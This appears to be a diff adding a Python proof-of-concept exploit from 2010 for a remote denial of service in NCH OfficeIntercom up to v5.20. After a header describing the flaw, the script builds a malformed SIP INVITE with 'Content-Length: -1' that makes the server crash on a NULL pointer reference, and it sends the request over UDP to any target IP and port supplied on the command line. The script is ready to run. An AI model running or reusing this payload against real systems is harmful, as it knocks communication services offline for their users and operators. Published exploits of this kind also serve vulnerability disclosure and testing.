@@ -1,0 +1,69 @@
+#!/usr/bin/python
+
+# Exploit Title: NCH Officeintercom <= v5.20 Remote Denial of Service Vulnerability
+# Date: 11/24/2010
+# Author: xsploited security
+# URL: http://www.x-sploited.com/
+# Contact: xsploitedsecurity [at] x-sploited.com
+# Software Link: http://www.nch.com.au/oi/oisetup.exe
+# Version: <= v5.20
+# Tested on: Windows XP SP3
+# CVE : N/A
+
+### Software Description: ###
+# Officeintercom lets you use your PC, Pocket PC and Smartphone to speak to others over the internet or a local area
+# network with simple "push-to-talk" technology. It works as a virtual IP intercom and feels a little like using a CB
+# radio. 
+# Talk to anyone else who has installed OfficeIntercom anywhere in the world from your PC or Pocket PC device. OfficeIntercom
+# is designed to be fast and easy to use and, in an office environment, no cabling is be required to run OfficeIntercom
+# because it uses the existing computer network. 
+
+### Exploit information: ###
+# NCH Office Intercom is prone to a remote denial of service attack when parsing a maliscous SIP invite request.
+# If the Content-Length field has a value of -1 (or a large integer such as 3645363) the server will crash due to a NULL pointer
+# reference, causing an access violation.
+
+### Shouts: ###
+# kaotix, MaX, corelanc0d3r/corelan team, exploit-db, packetstormsecurity, all other infosec researchers and websites
+#
+# "When you know that you're capable of dealing with whatever comes, you have the only security the world has to offer."
+#			-Harry Browne
+###
+
+import sys,socket
+
+if len(sys.argv) < 2:
+    print "[!] Error, Usage: " + sys.argv[0]+ " <Target IP> [Port]"
+    sys.exit(1)
+
+about = "================================================\n"
+about += "Title: Officeintercom <= v5.20 Remote DoS POC\n"
+about +=  "Author: xsploited security\nURL: http://www.x-sploited.com/\n"
+about +=  "Contact: xsploitedsecurity [at] gmail.com\n"
+about +=  "Shouts: kAoTiX, MaX, corelanc0d3r/corelan team,\nexploit-db, packetstormsecurity, and all other sites\n"
+about +=  "================================================\n"
+print about
+
+host = sys.argv[1]
+
+if len(sys.argv) > 2:
+    port = int(sys.argv[2])
+else:
+    port = 5060 #Default
+
+payload = ("INVITE sip:105@" + host + " SIP/2.0\r\n"
+"To: <sip:" + host + ":5060>\r\n"
+"Via: SIP/2.0/UDP localhost:10000\r\n"
+"From: \x22xsploitedsec\x22<sip:" + host + ":10000>\r\n"
+"Call-ID: f81d4fae7dec11d0a76500a0c91e6bf6@localhost\r\n"
+"CSeq: 1 INVITE\r\n"
+"Max-Forwards: 70\r\n"
+"Content-Type: application/sdp\r\n"
+"Content-Length: -1\r\n\r\n");
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+print "[*] Sending evil SIP request to " + host + ":" + str(port)
+s.sendto(payload,(host,port))
+print "[*] Data sent successfully"
+print "[*] Exiting..."
+s.close()
